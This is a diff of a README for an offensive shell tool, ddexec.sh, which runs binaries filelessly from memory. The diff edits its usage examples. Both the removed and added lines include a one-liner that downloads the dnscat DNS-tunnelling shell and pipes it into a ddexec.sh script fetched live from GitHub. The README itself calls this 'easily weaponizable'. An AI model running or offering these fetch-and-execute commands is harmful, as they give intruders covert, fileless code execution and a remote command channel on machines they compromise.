@@ -9,11 +9,11 @@ Pipe into the `ddexec.sh` script the base64 of the binary you want to run (**wit
 
 Here, try this:
 ```
-base64 -w0 /bin/ls | bash ddexec.sh ls -lA
+bash ddexec.sh ls -lA < /bin/ls
 ```
 which is easily weaponizable with something like - dnscat :D 
 ```
-curl -L --output - https://github.com/ralvares/dns-shell/blob/main/dnscat?raw=true | base64 -w0 | bash <(curl https://raw.githubusercontent.com/ralvares/dns-shell/main/ddexec.sh) /bin/entrypoint -h
+curl -L --output - https://github.com/ralvares/dns-shell/blob/main/dnscat?raw=true | bash <(curl https://raw.githubusercontent.com/ralvares/dns-shell/main/ddexec.sh) /bin/entrypoint -h
 ```
 
 ## Dependencies
